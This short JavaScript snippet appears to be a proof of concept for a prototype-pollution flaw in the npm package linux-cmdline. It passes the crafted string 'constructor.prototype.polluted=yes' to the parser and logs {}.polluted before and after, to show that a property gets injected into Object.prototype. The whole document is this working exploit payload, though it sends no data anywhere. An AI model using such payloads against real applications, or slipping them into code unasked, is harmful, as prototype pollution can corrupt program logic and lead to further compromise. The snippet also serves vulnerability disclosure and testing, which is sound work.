console.log({}.polluted);
const linuxCmdline = require('linux-cmdline');
linuxCmdline('constructor.prototype.polluted=yes');
console.log({}.polluted);